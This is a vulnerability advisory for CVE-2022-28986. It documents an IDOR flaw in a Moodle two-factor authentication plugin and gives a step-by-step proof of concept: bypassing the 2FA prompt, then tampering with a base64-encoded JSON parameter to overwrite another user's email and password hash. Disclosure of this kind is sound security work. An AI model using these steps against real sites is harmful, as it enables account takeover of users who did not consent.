# CVE-2022-28986

A Insecure direct object references (IDOR) vulnerability in "Simple 2FA Plugin for Moodle" by LMS Doctor

Vulnerability Details

Risk : Critical

Vendor: [LMS Doctor - Simple 2 Factor Authentication Plugin For Moodle](https://www.lmsdoctor.com/simple-2-factor-authentication-plugin-for-moodle)

Disclosed by: [Flaviu Popescu](https://flaviu.io)

Description:
Insecure direct object references (IDOR) vulnerability in The Simple 2FA Plugin for Moodle by "LMS Doctor". Allows remote attackers to update sensitive records such as email, password and phone number of other user accounts.

Proof of concept:

Initial login process using a self-registered account (dionach.tester):

POST /login/index.php

![image](https://user-images.githubusercontent.com/62330554/167461688-ded15d94-acfc-4ee7-9573-2376fcbaf47e.png)

Once the 2FA prompt is shown, the attacker force browses to the following URL instead of providing the 2FA code.

POST /auth/simple2fa/profile.php

![image](https://user-images.githubusercontent.com/62330554/174032083-fababc6e-0c8c-4ce7-9cca-e3b3da45096f.png)

This request is captured in Burp Suite:
![image](https://user-images.githubusercontent.com/62330554/167461803-60ac4d45-c2ae-464f-8af5-083d535c6504.png)

The parameter "u" contains a base64 encoded string. The string is decoded, which reveals data in JSON format as shown below:

![image](https://user-images.githubusercontent.com/62330554/167466721-0787e9af-9914-4c26-b7f6-630d87ffd639.png)

The attacker tampers with the JSON data, modifying the id, e-mail, password, and the name. The JSON data is encoded back into base64, updated in Burp Suite, and forwarded to the server.

New hash generation for the password: 


```bash
$ htpasswd -bnBC 10 "" pwn3d! | tr -d ':\n'\n
$2y$10$g/U56Hj5kb.C1mOoO6MR.Zrv1c4ml04z97CC.BdJPsMl.6LM4HVy                     
```

Snipped of tampered data:

```json
{"id":"8045","auth":"email","confirmed":"1","policyagreed":"0","deleted":"0","suspended":"0","mnethostid":"1","username":"dionach.tester2","password":"$2y$10$g/U56Hj5kb.C1mOoO6MR.Zrv1c4ml04z97CC.BdJPsMl.6LM4HVy","idnumber":"","firstname":"Dio","lastname":"Nach","email":"flaviu.popescu+1337@[..]", [..]
```

Resulting in the victim's account, id 8045 (dionach.tester2) being updated as shown below:

![image](https://user-images.githubusercontent.com/62330554/167465465-3a956a50-bb9a-4174-a12e-aeb06dea2292.png)
